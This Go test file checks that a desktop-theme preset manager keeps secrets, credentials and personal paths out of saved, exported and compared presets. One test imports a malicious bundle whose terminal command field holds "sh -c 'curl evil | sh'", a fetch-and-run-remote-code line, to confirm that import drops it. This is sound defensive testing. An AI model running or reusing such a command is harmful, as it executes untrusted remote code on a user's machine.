package presets

import (
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/stretchr/testify/assert"
)

// liveBar is a bar.json holding machine-local values: a download client
// endpoint with credentials, its RPC secret and a personal folder.
const liveBar = `{
  "position": "left",
  "activities": {"downloads": {
    "endpoints": {"qbittorrent": "http://me:pw@nas.home:8080"},
    "secrets": {"qbittorrent": "hunter2"}
  }},
  "moduleOptions": {"downloads": {"folder": "/home/me/Private"}}
}`

const leak1, leak2, leak3 = "hunter2", "nas.home", "/home/me/Private"

func writeLive(t *testing.T, m *Manager, domain, body string) {
	t.Helper()
	assert.NoError(t, os.MkdirAll(filepath.Dir(m.Store.File(domain)), 0o755))
	assert.NoError(t, os.WriteFile(m.Store.File(domain), []byte(body), 0o644))
}

func assertNoLeak(t *testing.T, what string, data []byte) {
	t.Helper()
	for _, s := range []string{leak1, leak2, leak3} {
		assert.NotContains(t, string(data), s, "%s leaks %q", what, s)
	}
}

func TestCatalogMachineLocal(t *testing.T) {
	m := newManager(t)
	for _, k := range []string{
		"bar.activities.downloads.secrets.qbittorrent", "bar.activities.downloads.secrets",
		"bar.activities.downloads.endpoints.aria2", "bar.moduleOptions.downloads.folder",
		"desktop.wallpaperFolders",
	} {
		assert.True(t, m.Cat.MachineLocal(k), k)
	}
	for _, k := range []string{"bar.position", "bar.activities.downloads.showSpeed", "theme.font"} {
		assert.False(t, m.Cat.MachineLocal(k), k)
	}
	assert.True(t, m.Cat.Secret("bar.activities.downloads.secrets.deluge"))
	assert.False(t, m.Cat.Secret("bar.activities.downloads.endpoints.deluge"))
}

func TestSecretsNeverLeaveTheMachine(t *testing.T) {
	m := newManager(t)
	writeLive(t, m, "bar", liveBar)

	saved, err := m.Save("Mine", nil, false)
	assert.NoError(t, err)
	data, _ := os.ReadFile(filepath.Join(saved.Path, "bar.json"))
	assertNoLeak(t, "a saved preset", data)
	assert.Contains(t, string(data), `"left"`, "the look is saved")

	file := filepath.Join(t.TempDir(), "x.json")
	_, err = m.Export(Current, file)
	assert.NoError(t, err)
	data, _ = os.ReadFile(file)
	assertNoLeak(t, "an exported bundle", data)

	diffs, err := m.Compare(Current, Defaults)
	assert.NoError(t, err)
	data, _ = json.Marshal(diffs)
	assertNoLeak(t, "preset diff", data)

	ins, err := m.Inspect(Current, "")
	assert.NoError(t, err)
	data, _ = json.Marshal(ins)
	assertNoLeak(t, "preset show", data)

	mixed, err := m.Mix("Mixed", map[string]string{"layout": Current}, "", false)
	assert.NoError(t, err)
	data, _ = os.ReadFile(filepath.Join(mixed.Path, "bar.json"))
	assertNoLeak(t, "a mixed preset", data)

	// A preset (or bundle) made before secrets were stripped still never
	// shows them.
	assert.NoError(t, os.WriteFile(filepath.Join(saved.Path, "bar.json"), []byte(liveBar), 0o644))
	diffs, err = m.Compare("Mine", Defaults)
	assert.NoError(t, err)
	data, _ = json.Marshal(diffs)
	assertNoLeak(t, "diff of an old preset", data)
	assert.False(t, strings.Contains(string(data), "secrets"), "local keys are not preset keys: %s", data)
}

func TestApplyAndRevertKeepMachineLocalKeys(t *testing.T) {
	m := newManager(t)
	writeLive(t, m, "bar", liveBar)
	check := func(what string) {
		t.Helper()
		data, err := os.ReadFile(m.Store.File("bar"))
		assert.NoError(t, err)
		for _, s := range []string{leak1, leak2, leak3} {
			assert.Contains(t, string(data), s, "%s keeps %q", what, s)
		}
	}
	_, _, err := m.Apply("Neon Tokyo")
	assert.NoError(t, err)
	check("apply")

	// A preset holding foreign local values (an old save, a bundle) never
	// replaces the user's.
	dir := filepath.Join(m.UserDir, "Foreign")
	assert.NoError(t, os.MkdirAll(dir, 0o755))
	assert.NoError(t, os.WriteFile(filepath.Join(dir, "bar.json"),
		[]byte(`{"activities": {"downloads": {"secrets": {"qbittorrent": "theirs"}}}}`), 0o644))
	_, _, err = m.Apply("Foreign")
	assert.NoError(t, err)
	check("apply of a preset with foreign secrets")

	_, _, err = m.Begin(TrySession, "Sumi-e")
	assert.NoError(t, err)
	check("try")
	_, err = m.End(TrySession, false, false)
	assert.NoError(t, err)
	check("revert")
}

func TestCommandsNeverTravelWithPresets(t *testing.T) {
	m := newManager(t)
	assert.True(t, m.Cat.MachineLocal("general.terminalCommand"), "commands are machine-local")
	assert.True(t, m.Cat.MachineLocal("general.terminal"), "the general domain is personal")
	for _, e := range m.Cat.Keys("", true) {
		if e.Format == "command" {
			assert.True(t, m.Cat.MachineLocal(e.Key), e.Key)
		}
	}
	writeLive(t, m, "general", `{"terminalCommand": "$TERMINAL -e $COMMAND"}`)
	saved, err := m.Save("Mine", nil, false)
	assert.NoError(t, err)
	assert.NotContains(t, saved.Domains, "general", "save never stores general")

	bundle := filepath.Join(t.TempDir(), "evil.json")
	assert.NoError(t, os.WriteFile(bundle, []byte(`{"format": "`+BundleFormat+`", "version": 1, "name": "Evil",
		"domains": {"general": {"terminalCommand": "sh -c 'curl evil | sh' #"}, "theme": {"roundness": 2}}}`), 0o644))
	p, problems, err := m.Import(bundle, "", false)
	assert.NoError(t, err)
	assert.NotContains(t, p.Domains, "general", "import drops general")
	assert.NotEmpty(t, problems, "the skipped domain is reported")
	_, err = os.Stat(filepath.Join(p.Path, "general.json"))
	assert.True(t, os.IsNotExist(err))
	_, _, err = m.Apply("Evil")
	assert.NoError(t, err)
	data, _ := os.ReadFile(m.Store.File("general"))
	assert.NotContains(t, string(data), "evil", "applying an imported bundle never sets a command")
	docs, err := m.Documents(bundle)
	assert.NoError(t, err)
	_, ok := docs["general"]
	assert.False(t, ok, "a bundle's general domain is never read")
}

// A preset carries the terminal look but never the machine state: the
// prompt switch and the engine stay as they are on this machine.
func TestPresetNeverSwitchesPromptOrEngine(t *testing.T) {
	m := newManager(t)
	for _, k := range []string{"terminal.enabled", "terminal.engine"} {
		assert.True(t, m.Cat.MachineLocal(k), k)
	}
	for _, k := range []string{"terminal.prompt", "terminal.padding", "terminal.cursorShape"} {
		assert.False(t, m.Cat.MachineLocal(k), k)
	}
	live := `{"enabled": false, "engine": "starship", "prompt": "pure", "padding": 12}`
	writeLive(t, m, "terminal", live)
	saved, err := m.Save("Mine", nil, false)
	assert.NoError(t, err)
	if assert.NoError(t, os.WriteFile(filepath.Join(saved.Path, "terminal.json"),
		[]byte(`{"enabled": true, "engine": "ohmyposh", "prompt": "zen"}`), 0o644)) {
		_, _, err = m.Apply("Mine")
		assert.NoError(t, err)
		var got map[string]any
		data, _ := os.ReadFile(m.Store.File("terminal"))
		assert.NoError(t, json.Unmarshal(data, &got))
		assert.Equal(t, false, got["enabled"])
		assert.Equal(t, "starship", got["engine"])
		assert.Equal(t, "zen", got["prompt"])
	}

	// no terminal section: terminal.json stays as it was
	assert.NoError(t, os.Remove(filepath.Join(saved.Path, "terminal.json")))
	writeLive(t, m, "terminal", live)
	_, _, err = m.Apply("Mine")
	assert.NoError(t, err)
	data, _ := os.ReadFile(m.Store.File("terminal"))
	assert.Equal(t, live, string(data))

	// saving never writes the machine keys
	saved2, err := m.Save("Mine2", nil, false)
	assert.NoError(t, err)
	data, _ = os.ReadFile(filepath.Join(saved2.Path, "terminal.json"))
	assert.NotContains(t, string(data), "enabled")
	assert.NotContains(t, string(data), "engine")
	assert.Contains(t, string(data), "pure")
}
